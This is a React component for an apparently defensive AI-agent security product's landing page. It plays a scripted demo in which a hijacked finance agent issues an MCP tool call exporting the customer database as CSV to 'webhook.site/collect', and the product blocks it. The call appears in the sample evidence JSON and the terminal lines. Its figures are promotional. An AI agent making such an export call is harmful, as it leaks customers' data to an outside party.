'use client';

import { useCallback, useState } from 'react';
import Link from 'next/link';
import {
  ArrowRight,
  ChevronDown,
  ChevronUp,
  Download,
  Loader2,
  ShieldAlert,
  ShieldCheck,
  Terminal,
} from 'lucide-react';

const EVIDENCE_HASH = '0x8f3c91a2e4b7d6f05c1a9e83b2d4f6a7c8e9d0f1a2b3c4d5e6f7a8b9c0d1ba2';

const SAMPLE_EVIDENCE_BUNDLE = {
  schemaVersion: '2.0',
  evidenceId: 'NS-EV-2026-MCP-HIJACK-8291',
  generatedAt: new Date().toISOString(),
  chain: {
    agentIdentity: 'FinanceBot-prod-7f2a',
    requestedIntent: 'Check August Invoice #8291',
    toolCall: {
      method: 'tools/call',
      name: 'export_customer_database',
      arguments: { format: 'csv', destination: 'webhook.site/collect' },
    },
    beforeStateHash: 'sha256:4a3f…c901',
    afterStateHash: 'sha256:UNVERIFIED — action blocked',
    cryptographicBundle: EVIDENCE_HASH,
  },
  interception: {
    status: 'BLOCKED',
    latencyMs: 11,
    riskScore: 88,
    intentDivergencePct: 96,
    capabilityAction: 'REVOKED → READ_ONLY fallback',
    evidenceStatus: 'VERIFIED',
    reputationImpact: { before: 92, after: 45, metric: 'MCP-SEC-SCORE' },
  },
  verify: {
    differentiator: 'Legacy gateways log prompts. Nexus Shield verifies actions.',
    unverifiedActionDetected: false,
  },
};

type SimPhase = 'idle' | 'intent' | 'attack' | 'intercept' | 'evidence' | 'done';

const TERMINAL_LINES: Record<SimPhase, string[]> = {
  idle: ['$ financebot run --intent "Check August Invoice #8291"'],
  intent: [
    '$ financebot run --intent "Check August Invoice #8291"',
    '▸ Agent context loaded · FinanceBot-prod-7f2a',
    '▸ User intent parsed: invoice lookup #8291',
  ],
  attack: [
    '$ financebot run --intent "Check August Invoice #8291"',
    '▸ Agent context loaded · FinanceBot-prod-7f2a',
    '▸ User intent parsed: invoice lookup #8291',
    '⚠ MCP tools/call: export_customer_database',
    '  {"format":"csv","destination":"webhook.site/collect"}',
  ],
  intercept: [
    '$ financebot run --intent "Check August Invoice #8291"',
    '▸ Agent context loaded · FinanceBot-prod-7f2a',
    '▸ User intent parsed: invoice lookup #8291',
    '⚠ MCP tools/call: export_customer_database',
    '  {"format":"csv","destination":"webhook.site/collect"}',
    '🛡 Nexus Shield Interceptor — 11ms',
    '   STATUS: BLOCKED',
    '   Risk Score: 88 | Intent Divergence: 96%',
    '   Capability: Revoked → READ_ONLY fallback',
  ],
  evidence: [
    '$ financebot run --intent "Check August Invoice #8291"',
    '▸ Agent context loaded · FinanceBot-prod-7f2a',
    '▸ User intent parsed: invoice lookup #8291',
    '⚠ MCP tools/call: export_customer_database',
    '  {"format":"csv","destination":"webhook.site/collect"}',
    '🛡 Nexus Shield Interceptor — 11ms',
    '   STATUS: BLOCKED',
    '   Risk Score: 88 | Intent Divergence: 96%',
    '   Capability: Revoked → READ_ONLY fallback',
    '✓ Evidence: VERIFIED (Hash: 0x8f3c…ba2)',
    '  Reputation: MCP-SEC-SCORE 92 → 45',
  ],
  done: [
    '$ financebot run --intent "Check August Invoice #8291"',
    '▸ Agent context loaded · FinanceBot-prod-7f2a',
    '▸ User intent parsed: invoice lookup #8291',
    '⚠ MCP tools/call: export_customer_database',
    '  {"format":"csv","destination":"webhook.site/collect"}',
    '🛡 Nexus Shield Interceptor — 11ms',
    '   STATUS: BLOCKED',
    '   Risk Score: 88 | Intent Divergence: 96%',
    '   Capability: Revoked → READ_ONLY fallback',
    '✓ Evidence: VERIFIED (Hash: 0x8f3c…ba2)',
    '  Reputation: MCP-SEC-SCORE 92 → 45',
    '✓ Session safe — unauthorized export never executed.',
  ],
};

export function AttackDemo() {
  const [phase, setPhase] = useState<SimPhase>('idle');
  const [running, setRunning] = useState(false);
  const [jsonOpen, setJsonOpen] = useState(false);
  const [simComplete, setSimComplete] = useState(false);

  const runSimulation = useCallback(() => {
    setRunning(true);
    setJsonOpen(true);
    setSimComplete(false);
    const sequence: SimPhase[] = ['intent', 'attack', 'intercept', 'evidence', 'done'];
    let i = 0;
    setPhase(sequence[0]!);
    const interval = window.setInterval(() => {
      i += 1;
      if (i >= sequence.length) {
        window.clearInterval(interval);
        setRunning(false);
        setSimComplete(true);
        setJsonOpen(true);
        return;
      }
      setPhase(sequence[i]!);
    }, 900);
    return () => window.clearInterval(interval);
  }, []);

  const downloadEvidence = useCallback(() => {
    const blob = new Blob([JSON.stringify(SAMPLE_EVIDENCE_BUNDLE, null, 2)], {
      type: 'application/json',
    });
    const url = URL.createObjectURL(blob);
    const anchor = document.createElement('a');
    anchor.href = url;
    anchor.download = 'nexus-shield-evidence-bundle.json';
    anchor.click();
    URL.revokeObjectURL(url);
  }, []);

  const lines = TERMINAL_LINES[phase];

  return (
    <section id="attack-simulator" data-demo="attack-demo" className="mx-auto max-w-7xl scroll-mt-24 px-6 py-16">
      <div className="mx-auto max-w-2xl text-center">
        <p className="text-[10px] font-semibold uppercase tracking-[0.2em] text-orange-400">
          No Login · No API Keys · Instant Sandbox
        </p>
        <h2 className="mt-3 text-3xl font-semibold tracking-tight text-zinc-50 sm:text-4xl">
          Simulate an MCP Hijack — Blocked in &lt;12ms
        </h2>
        <p className="mt-3 text-sm text-zinc-500 sm:text-base">
          One click runs a live FinanceBot scenario: authorized invoice lookup vs unauthorized database
          export — intercepted, revoked, and cryptographically verified.
        </p>
      </div>

      <div className="mt-10 overflow-hidden rounded-2xl border border-orange-500/20 bg-gradient-to-br from-zinc-950 via-zinc-900/90 to-orange-950/20 shadow-xl shadow-orange-500/5">
        <div className="flex flex-wrap items-center justify-between gap-3 border-b border-white/10 bg-zinc-900/80 px-5 py-4">
          <div className="flex items-center gap-2 text-xs text-zinc-500">
            <Terminal className="h-4 w-4 text-emerald-400" />
            Live Attack Simulation · FinanceBot
          </div>
          <button
            type="button"
            onClick={runSimulation}
            disabled={running}
            className="inline-flex select-none items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-orange-500 to-rose-500 px-5 py-3 text-sm font-semibold text-white shadow-lg shadow-orange-500/20 transition hover:scale-[1.01] disabled:opacity-60"
          >
            {running ? (
              <Loader2 className="h-4 w-4 animate-spin" />
            ) : (
              <ShieldAlert className="h-4 w-4" />
            )}
            SIMULATE HIJACK
          </button>
        </div>

        <div className="grid gap-0 lg:grid-cols-2">
          <div className="border-b border-white/10 bg-zinc-950 p-5 font-mono text-[11px] leading-relaxed sm:text-xs lg:border-b-0 lg:border-r">
            {lines.map((line, idx) => (
              <p
                key={`${phase}-${idx}`}
                className={
                  line.startsWith('⚠')
                    ? 'text-rose-400'
                    : line.startsWith('🛡')
                      ? 'text-cyan-300'
                      : line.startsWith('✓')
                        ? 'text-emerald-400'
                        : 'text-zinc-300'
                }
              >
                {line}
              </p>
            ))}
          </div>

          <div className="space-y-3 p-5">
            {[
              { label: 'STATUS', value: phase === 'idle' ? '—' : 'BLOCKED', tone: 'text-rose-400' },
              { label: 'Risk Score', value: phase === 'idle' ? '—' : '88', tone: 'text-amber-300' },
              { label: 'Intent Divergence', value: phase === 'idle' ? '—' : '96%', tone: 'text-amber-300' },
              {
                label: 'Capability',
                value: phase === 'idle' ? '—' : 'Revoked → READ_ONLY',
                tone: 'text-orange-300',
              },
              {
                label: 'Evidence',
                value: phase === 'idle' || phase === 'intent' || phase === 'attack' ? '—' : 'VERIFIED',
                tone: 'text-emerald-400',
              },
              {
                label: 'MCP-SEC-SCORE',
                value: phase === 'done' || phase === 'evidence' ? '92 → 45' : '—',
                tone: 'text-violet-300',
              },
            ].map(({ label, value, tone }) => (
              <div
                key={label}
                className="flex items-center justify-between rounded-lg border border-white/5 bg-zinc-900/60 px-3 py-2"
              >
                <span className="text-[10px] uppercase tracking-wider text-zinc-500">{label}</span>
                <span className={`font-mono text-sm font-semibold ${tone}`}>{value}</span>
              </div>
            ))}
          </div>
        </div>

        {simComplete && (
          <div className="border-t border-white/10 bg-zinc-950/80 p-5">
            <button
              type="button"
              onClick={() => setJsonOpen((v) => !v)}
              className="flex w-full items-center justify-between text-left text-xs font-semibold text-cyan-300"
            >
              Evidence Bundle (JSON)
              {jsonOpen ? <ChevronUp className="h-4 w-4" /> : <ChevronDown className="h-4 w-4" />}
            </button>
            {jsonOpen && (
              <pre className="mt-3 max-h-64 overflow-auto rounded-lg border border-white/10 bg-black/40 p-3 text-[10px] text-zinc-400">
                {JSON.stringify(SAMPLE_EVIDENCE_BUNDLE, null, 2)}
              </pre>
            )}
          </div>
        )}

        <div className="flex flex-wrap items-center justify-between gap-3 border-t border-white/10 bg-zinc-950/60 px-5 py-4">
          <div className="inline-flex items-center gap-2 text-xs text-zinc-500">
            <ShieldCheck className="h-3.5 w-3.5 text-emerald-400" />
            VERIFY — legacy gateways log prompts; Nexus Shield verifies actions
          </div>
          <div className="flex flex-wrap gap-2">
            <button
              type="button"
              onClick={downloadEvidence}
              disabled={phase === 'idle'}
              className="inline-flex items-center gap-1.5 rounded-lg border border-cyan-500/30 bg-cyan-500/10 px-3 py-1.5 text-xs font-semibold text-cyan-200 transition hover:bg-cyan-500/15 disabled:opacity-40"
            >
              <Download className="h-3 w-3" />
              Download Evidence Bundle
            </button>
            <Link
              href="/docs/benchmark"
              className="inline-flex items-center gap-1.5 rounded-lg border border-emerald-500/30 bg-emerald-500/10 px-3 py-1.5 text-xs font-semibold text-emerald-300 transition hover:bg-emerald-500/15"
            >
              Reproduce MCP-SEC-SCORE
              <ArrowRight className="h-3 w-3" />
            </Link>
          </div>
        </div>
      </div>
    </section>
  );
}
